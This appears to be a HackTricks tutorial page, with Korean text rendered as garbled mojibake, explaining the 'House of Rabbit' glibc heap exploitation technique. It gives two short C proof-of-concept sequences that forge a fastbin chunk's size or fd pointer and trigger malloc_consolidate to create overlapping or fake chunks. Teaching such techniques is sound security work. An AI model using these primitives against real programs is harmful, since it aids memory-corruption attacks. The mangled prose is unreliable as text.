# í† ë¼ì˜ ì§‘

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì‹¤ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì‹¤ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass) ì°¸ì—¬ ë˜ëŠ” **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** íŒ”ë¡œìš°í•˜ê¸°**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ ìš”ë ¹ ê³µìœ í•˜ê¸°.

</details>
{% endhint %}

### ìš”êµ¬ ì‚¬í•­

1. **ë¹ ë¥¸ ë°”ì´ë„ˆë¦¬ fd í¬ì¸í„° ë˜ëŠ” í¬ê¸° ìˆ˜ì • ëŠ¥ë ¥**: ì´ëŠ” fastbinì˜ ì²­í¬ì˜ í¬ì›Œë“œ í¬ì¸í„° ë˜ëŠ” í¬ê¸°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
2. **`malloc_consolidate`ë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**: í° ì²­í¬ë¥¼ í• ë‹¹í•˜ê±°ë‚˜ ìƒë‹¨ ì²­í¬ë¥¼ ë³‘í•©í•˜ì—¬ ì²­í¬ë¥¼ í†µí•©í•˜ë„ë¡ ê°•ì œí•¨ìœ¼ë¡œì¨ ì´ë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ëª©í‘œ

1. **ì¤‘ì²©ëœ ì²­í¬ ìƒì„±**: ë‹¤ë¥¸ ì²­í¬ì™€ ì¤‘ì²©ë˜ëŠ” í•˜ë‚˜ì˜ ì²­í¬ë¥¼ ê°€ì§€ê³  í™ ì¡°ì‘ì„ ë” ìˆ˜í–‰í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.
2. **ê°€ì§œ ì²­í¬ ì¡°ì‘**: í• ë‹¹ê¸°ë¥¼ ì†ì—¬ ê°€ì§œ ì²­í¬ë¥¼ í•©ë²•ì ì¸ ì²­í¬ë¡œ ì·¨ê¸‰í•˜ë„ë¡ í•©ë‹ˆë‹¤.

## ê³µê²© ë‹¨ê³„

### POC 1: ë¹ ë¥¸ ë°”ì´ë„ˆë¦¬ ì²­í¬ì˜ í¬ê¸° ìˆ˜ì •

**ëª©í‘œ**: fastbin ì²­í¬ì˜ í¬ê¸°ë¥¼ ì¡°ì‘í•˜ì—¬ ì¤‘ì²©ëœ ì²­í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 1: ì²­í¬ í• ë‹¹**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **ë‹¨ê³„ 2: ì²­í¬ í•´ì œ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **ë‹¨ê³„ 3: ì²­í¬ í¬ê¸° ìˆ˜ì •**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **ë‹¨ê³„ 4: `malloc_consolidate`ë¥¼ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
ëŒ€ê·œëª¨ ì²­í¬ë¥¼ í• ë‹¹í•˜ë©´ `malloc_consolidate` í•¨ìˆ˜ê°€ íŠ¸ë¦¬ê±°ë˜ì–´ ë¹ ë¥¸ binì—ì„œ ì‘ì€ ì²­í¬ë¥¼ ë³‘í•©í•©ë‹ˆë‹¤. `chunk1`ì˜ ì¡°ì‘ëœ í¬ê¸°ë¡œ ì¸í•´ `chunk2`ì™€ ê²¹ì¹©ë‹ˆë‹¤.

í†µí•© í›„ `chunk1`ì€ `chunk2`ì™€ ê²¹ì³ì ¸ ì¶”ê°€ì ì¸ ì•…ìš©ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤.

### POC 2: `fd` í¬ì¸í„° ìˆ˜ì •

**ëª©í‘œ**: ë¹ ë¥¸ bin `fd` í¬ì¸í„°ë¥¼ ì¡°ì‘í•˜ì—¬ ê°€ì§œ ì²­í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 1: ì²­í¬ í• ë‹¹**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**ì„¤ëª…**: ìš°ë¦¬ëŠ” ê°€ì§œ ì²­í¬ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ í•˜ë‚˜ëŠ” ì‘ê³  ë‹¤ë¥¸ í•˜ë‚˜ëŠ” í° ë‘ ì²­í¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 2: ê°€ì§œ ì²­í¬ ìƒì„±**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **ë‹¨ê³„ 3: `chunk1`ì„ í•´ì œí•©ë‹ˆë‹¤**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**ì„¤ëª…**: ìš°ë¦¬ëŠ” `chunk1`ì„ í•´ì œí•˜ì—¬ fastbin ëª©ë¡ì— ì¶”ê°€í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 4: `chunk1`ì˜ `fd` ìˆ˜ì •**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**ì„¤ëª…**: `chunk1`ì˜ ì „ë°©í–¥ í¬ì¸í„°(`fd`)ë¥¼ `chunk2` ë‚´ì˜ ê°€ì§œ ì²­í¬ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ë³€ê²½í•©ë‹ˆë‹¤.

* **ë‹¨ê³„ 5: `malloc_consolidate`ë¥¼ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
ëŒ€ê·œëª¨ ì²­í¬ë¥¼ ë‹¤ì‹œ í• ë‹¹í•˜ë©´ `malloc_consolidate`ê°€ íŠ¸ë¦¬ê±°ë˜ì–´ ê°€ì§œ ì²­í¬ë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤.

ê°€ì§œ ì²­í¬ëŠ” fastbin ëª©ë¡ì˜ ì¼ë¶€ê°€ ë˜ì–´ ì¶”ê°€ì ì¸ ì•…ìš©ì„ ìœ„í•œ í•©ë²•ì ì¸ ì²­í¬ê°€ ë©ë‹ˆë‹¤.

### ìš”ì•½

**House of Rabbit** ê¸°ìˆ ì€ fast bin ì²­í¬ì˜ í¬ê¸°ë¥¼ ìˆ˜ì •í•˜ì—¬ ê²¹ì¹˜ëŠ” ì²­í¬ë¥¼ ë§Œë“¤ê±°ë‚˜ `fd` í¬ì¸í„°ë¥¼ ì¡°ì‘í•˜ì—¬ ê°€ì§œ ì²­í¬ë¥¼ ë§Œë“œëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” í™(heap)ì—ì„œ í•©ë²•ì ì¸ ì²­í¬ë¥¼ ì¡°ì‘í•˜ì—¬ ë‹¤ì–‘í•œ í˜•íƒœì˜ ì•…ìš©ì„ ê°€ëŠ¥ì¼€ í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë‹¨ê³„ë¥¼ ì´í•´í•˜ê³  ì—°ìŠµí•¨ìœ¼ë¡œì¨ í™ ì•…ìš© ê¸°ìˆ ì„ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
